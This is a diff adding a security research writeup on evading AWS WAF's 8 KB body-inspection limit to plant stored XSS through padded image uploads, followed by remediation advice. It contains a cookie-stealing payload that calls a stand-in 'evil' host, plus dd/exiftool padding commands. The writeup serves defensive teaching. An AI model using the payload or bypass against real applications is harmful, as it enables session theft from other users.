@@ -1,0 +1,152 @@
+---
+title: "Bypassing AWS WAF's 8 KB Body Inspection Limit for Stored XSS"
+summary: "AWS WAF inspects only the first 8 KB of a request body by default. A modest image upload endpoint, fronted by an otherwise solid WAF rule set, can be coerced into accepting a stored XSS payload by padding the request past that threshold and parking the script tag in the bytes the inspector never sees. The payload then sits in object storage and waits to be served back."
+date: 2026-03-03
+severity: High
+cvss: 8.8
+cwe: "CWE-79"
+product: "AWS WAF / web application fronted by AWS WAF"
+status: "Public"
+tags: ["aws-waf", "stored-xss", "waf-bypass", "research", "class-of-vuln"]
+order: 10
+featured: false
+type: "Research"
+readingTime: 5
+---
+
+AWS WAF is a layer-seven firewall, and like every layer-seven firewall it has to decide how
+much of each request to actually look at. For request bodies, the default size limit is **8
+kilobytes**. Anything past the threshold passes through uninspected. AWS documents this
+clearly in the
+[WAF developer guide](https://docs.aws.amazon.com/waf/latest/developerguide/web-acl-statements-fields.html#waf-rule-statement-fields-body-request-component) —
+but in production threat-modelling sessions I see the 8 KB number forgotten or
+underweighted again and again. This writeup is the bypass shape that follows from that
+oversight.
+
+The pattern was identified during an authorised adversarial assessment of a production WAF
+deployment. Client-identifying details are redacted; the technique is generic to any
+application that follows the same three properties.
+
+## When does this matter?
+
+Three conditions have to hold simultaneously:
+
+1. The endpoint accepts a **file upload** or a request body large enough to plausibly
+   exceed 8 KB.
+2. The uploaded content is **stored** somewhere (S3, EFS, a database BLOB) and is
+   subsequently **served back** to other users — directly, or through a CDN — without
+   server-side sanitisation.
+3. The WAF rule set is leaned on as the primary XSS / payload-content control, rather than
+   as one layer among several.
+
+That last point is where most environments fail. A WAF is often deployed because there is no
+secure-by-default validation at the application tier. The team ships the rules, watches them
+block the obvious XSS shapes in the body, and treats the problem as solved. The bypass is
+the inversion: keep the rules, defeat them by simply pushing the payload past the inspection
+window.
+
+## The technique
+
+A small image with an inline `<script>` near the start of the body is reliably blocked. The
+malicious bytes are inside the inspection window, the rule matches, the request is rejected.
+
+```
+POST /api/upload HTTP/1.1
+Host: target.example
+Content-Type: multipart/form-data; boundary=---xss
+
+-----xss
+Content-Disposition: form-data; name="file"; filename="x.jpg"
+Content-Type: image/jpeg
+
+JFIF\xff...<svg/onload=fetch('//evil/'+document.cookie)>...
+-----xss--
+```
+
+→ HTTP 403 from the WAF. Expected.
+
+Now pad. A one-megabyte JPEG generated with `dd`, the same XSS payload appended in EXIF
+metadata or simply concatenated at the end of the file:
+
+```bash
+# Generate a 1 MB image with valid JPEG headers
+dd if=/dev/urandom bs=1024 count=1024 of=padded.jpg
+exiftool -overwrite_original -Comment="$(cat payload.html)" padded.jpg
+```
+
+The body now looks like *valid image headers, then 1 MB of pixel data, then somewhere past
+byte 8192 the script tag*. Same multipart upload as before, same WAF rule set:
+
+```
+POST /api/upload HTTP/1.1
+...
+(1 MB of body)
+```
+
+→ HTTP 200. The file is now in S3. The payload survived because the inspector never read it.
+
+When the file is later served back — typically rendered inline because the storage URL is
+public or because the application embeds it in HTML — the script tag is parsed by the
+browser. Stored XSS, with all the usual consequences for whichever user's session reaches the
+page first.
+
+## Why the 8 KB number exists
+
+The 8 KB limit is not a bug. AWS defends inspection cost: examining megabyte-class bodies in
+the WAF data path is expensive and would slow every legitimate request. The 8 KB default is
+a sensible cost trade-off for the average application.
+
+What gets lost is that the trade-off is yours to make explicitly. WAF lets you raise the
+body-inspection limit to 16 KB, 32 KB, or 64 KB on regional WAFs (CloudFront-fronted WAFs
+remain at 16 KB on the higher tiers). Raising the limit costs money and latency; failing to
+raise it costs you the assumption that the WAF is reading the whole body.
+
+## Remediation, in order of how much I trust each layer
+
+The temptation is to bump the inspection limit and call it done. That helps but it does not
+fix the class of bug — it shifts the threshold, and a sufficiently determined attacker pushes
+the payload past the new threshold instead.
+
+The fix order I recommend:
+
+1. **Server-side validation independent of the WAF.** Treat every uploaded file as
+   untrusted. Verify the MIME type from the actual bytes, not the
+   `Content-Type` header. Re-encode images through a known-good library (sharp,
+   ImageMagick with a strict policy.xml) that drops anything that isn't pixel data. For SVG,
+   parse the XML and reject scripts and event handlers. For JPEG/PNG/GIF, strip EXIF and
+   comment chunks.
+2. **Content-Type pinning when serving.** Files in user-supplied object storage should be
+   served with `Content-Type: application/octet-stream` and `Content-Disposition:
+   attachment` *unless* the storage layer can certify the bytes. Browsers will not parse the
+   response as HTML or render an inline SVG.
+3. **Storage-tier path discipline.** Keep uploaded content on a distinct origin or
+   subdomain so a payload that does execute is bound to a sandboxed cookie scope. The
+   sensitive cookies should not be reachable from `uploads.example.com`.
+4. **Raise the WAF body-inspection limit** to the highest tier you can afford for the
+   relevant rule set. This is defence in depth, not a fix.
+5. **Output encoding everywhere downstream.** Anywhere uploaded content is rendered into
+   HTML, escape or DOM-purify the surrounding context.
+
+The first item by itself defeats the attack regardless of WAF configuration. The remaining
+items reduce blast radius if step one slips.
+
+## A short list of related cases worth knowing
+
+This bypass shape — payload outside the inspection window — generalises beyond AWS WAF:
+
+- **CDN WAFs** (Cloudflare, Akamai, Imperva) all have body-inspection limits. Cloudflare
+  default is 128 KB on enterprise plans, smaller on free/pro; Akamai is configurable per
+  policy. Each has its own threshold. The technique is the same.
+- **Inspection-aware encoding**. Chunked transfer-encoding, gzipped bodies, and
+  `multipart/form-data` with a delayed `Content-Length` can each shift what the inspector
+  reads.
+- **Header inspection limits**. Many WAFs cap per-header inspection length at 8 KB. Token
+  smuggling and host-header attacks can sometimes exploit the same trick.
+
+## Closing note
+
+WAF rules are a fine bandaid. They are an unreliable load-bearing control. If you take one
+thing from this writeup, let it be: *what does the WAF actually read?* Find the limit,
+write it on a card, and pin it to the threat-model document. Every rule set you author is
+evaluated against bytes that fit inside that window. The bytes outside it are the
+application's problem.
